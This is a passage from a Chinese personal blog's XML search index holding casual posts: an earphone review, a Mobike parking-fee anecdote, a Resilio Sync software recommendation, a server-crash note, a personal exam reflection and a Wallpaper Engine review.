<p>佩戴体验的话，和大部分入耳式耳机差不多，佩戴感受一般，机身也有点磕耳朵。长时间佩戴的话耳朵肯定会疼，需要拿下来休息一下。</p>
<p>音质的话，毕竟万元以下听个响，几百块的耳机毕竟不能和人家高端大厂的比，更不用说是分体式蓝牙耳机，听觉并不是特别的惊艳，只能说勉强达到了自己心中的预期。感觉就比原来的那个40块的有线耳机好一点点。不过这些都是很主观的东西，都是玄学，大家看看就行了。</p>
<p>观看视频的话，在使用 Bilibili 的时候并没有出现明显的延迟现象，似乎是因为其客户端有校正功能，我平时看视频也只用 Bilibili，所以感觉还行。 自然地听音乐的话也不用太在意延迟问题。</p>
<p>在配对完成之后，耳机在拿出后会自动配对上一个连接的设备。不过，我在连接同一设备上的 macOS 后打开 Windows 就会出现无法连接的情况，应该是不兼容啥的，删除设备重新连接以后就可以了。</p>
<p>续航方面，这玩意是真的牛皮，我从上午一路七八点听音乐，中间休息过一下，停止音乐，但没放入充电仓，一直用到晚上八点多，才将耳机电量耗完。最令我满意的就是这玩意的续航。配合充电仓的话，这玩意够我重度使用三天左右吧。</p>
<p>这款耳机价格399，说实话，我觉得不是很值。即使耳机续航优秀，但其他方面却表现一般。当然了，400块钱还想耳机能上天来着，那是不可能的。这个耳机在平时练琴的时候跟跟音乐用就特别舒服，不像之前用有线耳机那样总是卡线。</p>
<p>总体评价，这玩意55分吧</p>
]]></content>
      <categories>
        <category>无聊吐吐槽</category>
      </categories>
  </entry>
  <entry>
    <title>【佛系生活】摩拜违停车辆（被）管理初体验（雾</title>
    <url>/archives/mobike-management.html</url>
    <content><![CDATA[<blockquote>
<p>摩拜日前在北京划定运营电子围栏，用户可以在电子围栏中骑行、停车。若停在电子围栏以外区域，将从第二次起收取5元的管理费用，缴纳费用后，如在24小时内将车辆骑回运营区域内，系统返还费用。 —— _北京青年报_《摩拜单车违停两次将扣费5元》</p>
</blockquote>
<span id="more"></span>

<p>最近两三个月的时间，附近的摩拜突然间少了很多，乱停乱放的单车也少了很多，大多数单车都到了指定的停车点停放，不过那个停车点太远了，所以就懒得上去用了。 对于我这种十个月甚至九个月都在家里躺着玩电脑的死肥宅来说，我也好久(没出过门了)没用过摩拜了，上一次用摩拜还是在不知道几个月之前，今早出来骑过村子顺便吃个早饭锁上车，反手就收到了停在禁停区的违停提醒。 <img data-src="/images/Date/2018/10/mobike-warn-1.png"> 虽然说这个措施好像已经几个月了，在以前停入违停区的时候仅仅会提醒单车停入了禁停区，可能会扣除信用积分巴拉巴拉的，但具体措施还是不够完善，经常在学校看到有将单车放在宿舍楼底下的，每当看到这种行为也感觉十分反感。不过，收取5块钱车辆管理费这还是无可厚非的，并且如果在规定时间内将任意禁停区的任意摩拜车辆骑出禁停区也会返还费用，不但管理车辆还节省了工作人员寻找车辆的人力成本，岂不美哉（ 当然，我只是来吃个早饭的，吃完早饭我就骑走了，在骑出禁停区并锁车的同时，收到了管理费退还短信。 <img data-src="/images/Date/2018/10/mobike-warn-2.png"> 0000 0 不过，这个5块钱的车辆管理费是退还到余额的，并不是退到支付方式的账号上的。 当作自己吃了两份早餐了，哼（吃个早饭比吃午饭还贵</p>
]]></content>
      <categories>
        <category>佛系生活</category>
        <category>碎碎念</category>
      </categories>
  </entry>
  <entry>
    <title>【Resilio Sync】一款实用而又好用的多平台同步软件</title>
    <url>/archives/resilio-sync.html</url>
    <content><![CDATA[<p>像我这种学生党经常需要偷偷摸摸地同步老师的课件，对于有收拾强迫症的我就会选择在课室电脑某个地方开个文件夹分好类，有时老师会修改一些课件，这样插 U 盘拷贼鸡儿麻烦，要我重新全部拷一遍。反正课室电脑有网络，怎样方便而又快捷地在不同地方同步文件？Resilio Sync不失为一个不错的选择。</p>
<span id="more"></span>

<blockquote>
<p>技术原理： Resilio Sync使用P2P协议同步软件<a href="https://zh.wikipedia.org/wiki/Resilio_Sync#cite_note-18">[18]</a>。该协议用于在多个设备间传递大文件时非常有效<a href="https://zh.wikipedia.org/wiki/Resilio_Sync#cite_note-19">[19]</a>，与<a href="https://zh.wikipedia.org/wiki/%CE%9CTorrent" title="ΜTorrent">µTorrent</a>和<a href="https://zh.wikipedia.org/wiki/BitTorrent_(%E8%BD%AF%E4%BB%B6)" title="BitTorrent (软件)">BitTorrent</a>使用的协议类似 。Resilio Sync中，用户数据并不在云端，而是存储在本地硬盘中，因此在同步数据时需要至少一台持有数据的计算机处于开机状态。Resilio Sync使用在计数模式中AES-128密钥，该密钥可随机生成，或由用户设置。在Resilio Sync中该密钥称为secret，可告知给其他用户以便共享数据。数据是直接从一台设备上发送到另一台设备中，因此需要数据所在设备在网络上可访问。如果原设备不可访问，则数据由其他节点传播，这些传播节点无需知道原先的secret，但只有知道secret的节点才能解码并查看数据。 可以将secret告知给某个节点，这样就将该节点加入到同步系统中，使其可以访问数据。当创建新节点时，用户可以将原secret告知给新节点；若出于安全性考虑，也可以创建一次性使用的secret。用户还可以通过Resilio Sync客户端生成一个只读的secret，这样当新节点接收到这个secret时，只能查看文件而无法修改。 Resilio Sync对需要同步的文件大小没有限制，唯一的限制就是不同的同步设备中都需要有足够的空间容纳所要同步的文件<a href="https://zh.wikipedia.org/wiki/Resilio_Sync#cite_note-20">[20]</a>。 —— 转自 <a href="https://zh.wikipedia.org/wiki/Resilio_Sync">维基百科</a></p>
</blockquote>
<p>  <strong>瞎鸡儿扯淡时间：</strong> 这个软件的同步方法也特别有趣，以一个可能不恰当的比喻就是，你这里写了一份笔记，然后你可以把你的笔记分享给其他同学，但你比较蛋疼，你写完还得让人家看不懂瞎鸡儿换成密文，其他同学需要拿着你的密钥并且拥有你的密码簿才能知道你笔记内容并且抄写，一个同学抄完了以后还可以同时给其他同学去抄，至于抄的速度如何那得看你字写的辨识度高不高，你写字快不快。同学们都贼牛逼，一个人可以看着几个在抄作业的同学的笔记本，别人也可以看那个同学的，同学们都挤在一起抄，但同样也是需要拿着你的密钥并且有你的密码簿。小明抄笔记可能只拿着你的只读密钥，这样小明抄出来的笔记可能自己再改了一下或者偷懒漏了一些东西不想抄，小明可能想拿着这些自己改的喊一声“诶你要不要看看我写的笔记贼牛逼”，但同学们都不会理小明，因为他只有只读密钥。这时候你大喊一句：“诶我这里抄错了，你们抄了我笔记的赶快改改。”这样，拥有密钥的同学都积极响应，并且修改了笔记的内容，当然，没有密钥的同学都当你是傻子，并不用担心笔记泄漏的问题。再比如说，班长也拥有你的读写密钥，那他让同学们改的时候，你也得跟着。 在文件同步的时候，这个软件会把你的文件分成小小戳，然后只把你改过的给同步上去，便减小了上传或者下载的大小。 这个软件我主要用在本地改代码的时候，他给我自动同步到服务器上，省得我慢慢上传，当你有多台服务器的时候，在本地改完代码以后便可以在这些服务器上自动给部署上新的代码，节省了时间，也更加方便快捷。当然，你也可以用它来做各种各样文件夹同步的玩意儿。 在手机与电脑同步也很方便，只需要把生成的密钥填入框中开始同步即可。链接？在下边。 至于 Linux 服务器如何搭建，有时间可能会写一写，不过这玩意儿应该搜索出来有很多搭建的教程，看着搭就好。 当然， Pro 版也有更多的功能，比如选择性同步（仅同步选定的文件或文件夹），如果你不需要 Pro 功能的话，Free 版也能满足你的需求。     <strong>使用方法：</strong> 一图流 <a href="/images/Date/2018/04/rslsyncscn.png"><img data-src="/images/Date/2018/04/rslsyncscn.png"></a> 先点左上角的加号，在需要被同步的地方添加标准文件夹，选择文件夹，拿到密钥，然后在需要拿同步数据的地方点击输入密钥，填入密钥，选择放置的文件夹，<em>注意文件夹最好为空</em>，然后就会开始同步。 哦还有一件事儿，这玩意儿在国内…… 所以你们记得备上那玩意儿，不然没法用 设置方法：设置 -&gt; 高级 -&gt; 使用代理服务器 -&gt; 填入代理服务器地址端口（非国内）即可   <strong>下载地址（自备那玩意儿）:</strong> 官方网址：<a href="https://www.resilio.com/">https://www.resilio.com</a> 下载地址： <a href="https://www.resilio.com/individuals/">https://www.resilio.com/individuals/</a> <a href="https://itunes.apple.com/us/app/id1126282325">iOS</a>、<a href="https://play.google.com/store/apps/details?id=com.resilio.sync">Android</a>、<a href="https://www.microsoft.com/zh-cn/store/p/resilio-sync/9wzdncrdmw96">WP</a>   <strong>结尾碎碎念：</strong> 所以我就说我文笔超烂，大家凑合着看就好，写完以后才发现我tm到底写了什么鬼（x</p>
]]></content>
      <categories>
        <category>软件推荐</category>
      </categories>
  </entry>
  <entry>
    <title>【碎碎念】服务器滚挂了</title>
    <url>/archives/server-boom.html</url>
    <content><![CDATA[<p>之前 618 和朋友买了一台 Virmach 的服务器，想都没想直接就上 Arch Linux 了（<br>昨天服务器给滚上最新版，然而好像 OVZ 和最新的 Arch 某个玩意儿不兼容来着，然后服务器就挂了，Bot 和 API 啥的东西全部丢失了（对的而且还没有任何备份，康了一下之前的文章感觉莫名的讽刺），开了个工单联系 Virmach 的客服。得知备份需要<strong>10美元/次</strong>，想想还是算了，就这样把东西推翻重写也挺好。<br>（好像也好久没更新博客了，以后经常随便水几篇）（逃</p>
]]></content>
      <categories>
        <category>无聊吐吐槽</category>
      </categories>
  </entry>
  <entry>
    <title>【碎碎念】是时候重新出发了</title>
    <url>/archives/time-to-start-again.html</url>
    <content><![CDATA[<p>最近的考试很快就结束了，自我感觉这次考得不错，然而当我拿成绩比对了一下录取的分数线以后，才发现相差了十分大的距离，而这次考试还算是我考得最好的一次，就这样，感觉有点小失落。成天说学写代码写代码，但是学了一段时间，也没学得像个模样。再加上冲刺这段时间感觉学这玩意儿没啥用，况且自己编程压根可以说算是没有基础，在冲刺阶段补这玩意儿没啥意义，还不如努力一把看能不能冲上前去比较好。于是，打算重拾一些东西，同时也暂时放下一些东西，重新出发，寻找最真实的自己 <img data-src="/images/Date/2018/10/Snipaste_2018-10-01_21-57-38-1024x663.png"> 虽然说努力并不是做出来给人看的，但留一个放下的足迹吧。 努力后，再见。</p>
]]></content>
      <categories>
        <category>碎碎念</category>
      </categories>
  </entry>
  <entry>
    <title>【碎碎念】从 Typecho 迁移到了 Wordpress</title>
    <url>/archives/typecho-wordpress.html</url>
    <content><![CDATA[<p>终于还是忍不住 Wordpress 丰富的插件，回到 Wordpress 玩玩 别过一会儿没忍住又回到了 Typecho 就行（逃</p>
]]></content>
      <categories>
        <category>碎碎念</category>
      </categories>
  </entry>
  <entry>
    <title>【Wallpaper Engine】 一款极其优美的动态壁纸软件</title>
    <url>/archives/wallpaper-engine.html</url>
    <content><![CDATA[<p>上个星期逛知乎的时候，发现一个 <a href="https://www.zhihu.com/question/54106076">如何评价 Steam 软件 Wallpaper Engine在国内的热销？</a> 的问题，看着描述还挺动人，于是我就 注册了一个Steam账号来 下载了这款软件。</p>
<span id="more"></span>

<p><img data-src="/images/Date/2017/02/1375464695.png" alt="Price.PNG" title="Price.PNG"></p>
<p>该软件目前售价 ￥18，看上去这么牛逼当然要买买买</p>
<p>不过细细一想，我这台破电脑真的带得起吗？管他呢</p>
<p>PS:老电脑配置:8G RAM + GEForce 7025 集成显卡 + AMD Sempron X2 180 + 64位Windows7专业版</p>
<p>装好steam，装好Wallpaper Engine打开的那一瞬间！欧拉欧拉欧拉！</p>
<p><img data-src="/images/Date/2017/02/1728170371.jpg" alt="error.jpg" title="error.jpg"></p>
<p>（</p>
<p>那我就换台电脑试试吧</p>
<p><img data-src="/images/Date/2017/02/1.gif" alt="run" title="run"></p>
<p>上面的图来自Wallpaper Engine 创意工厂中的 <a href="http://steamcommunity.com/sharedfiles/filedetails/?id=838289251">Touhou-东方Project-灵梦&amp;魔理沙-1080P 60帧 精细动态循环壁纸</a> ，实际上跑起来并没有像上面的gif图中这么卡顿，我只是为了减小文件大小而已（</p>
<p>你也可以在<a href="http://steamcommunity.com/app/431960/workshop/">创意工场</a>中下载自己喜欢的动态壁纸。当然，如果你喜欢的话，你也可以用自带的。（反正我不喜欢</p>
<p><img data-src="/images/Date/2017/02/269201430.png" alt="anime.PNG" title="anime.PNG"></p>
<p>实际上也是动漫壁纸居多</p>
<p>既然是动态壁纸，这也带给我一个蛮困扰的地方（</p>
<p>在使用teamviewer进行远程控制的时候，由于动态壁纸，就会不由得显得特别卡顿。虽然teamviewer有删除对方壁纸的选项，但是好像对动态壁纸完全不起作用。</p>
<p>软件截图：<br><img data-src="/images/Date/2017/02/2211757122.jpg" alt="1.jpg" title="1.jpg"></p>
<p><img data-src="/images/Date/2017/02/2006308437.jpg" alt="1.jpg" title="1.jpg"></p>
<p>它还资瓷从各种各样的文件打开，包括网页文件，视频文件，gif文件甚至是exe/pkg等文件。</p>
<p>它还可以从网页中打开</p>
<p><img data-src="/images/Date/2017/02/2012339795.jpg" alt="1.jpg" title="1.jpg"></p>
<p>不过并不能使用编辑框，带_blank属性的a标签等等也不能使用<br>老板这真的就是我的桌面啊！我真的没有在上班时间上知乎 之类的</p>
<hr>
<p>但我那台老爷机怎么办呢？我不服！<br>于是我就开始找解决方案</p>
<p><img data-src="/images/Date/2017/02/3261591576.jpg" alt="1.jpg" title="1.jpg"></p>
<p>似乎并没有很多人遇到我这种情况</p>
<p><img data-src="/images/Date/2017/02/2123523178.jpg" alt="1.jpg" title="1.jpg"></p>
<p>然后就没有这个报错了×<br>重新选一张试试</p>
<p><img data-src="/images/Date/2017/02/1325921117.jpg" alt="1.jpg" title="1.jpg"></p>
<p>但是CPU占用量却特别高……<br>所以我就只能选一个占用最低的动漫壁纸了</p>
<p>总体来说，这种动态壁纸对我这种热爱二次元的人来说还是蛮合适的，感觉也买得挺值吧（雾<br>而且还能起到很好的装逼作用<br>但是不太建议配置太渣（比如我这台破烂）、很老的机子使用，毕竟装逼也是有代价的（雾</p>
]]></content>
      <categories>
        <category>软件推荐</category>
      </categories>
      <tags>
        <tag>果果</tag>
      </tags>
  </entry>
</search>
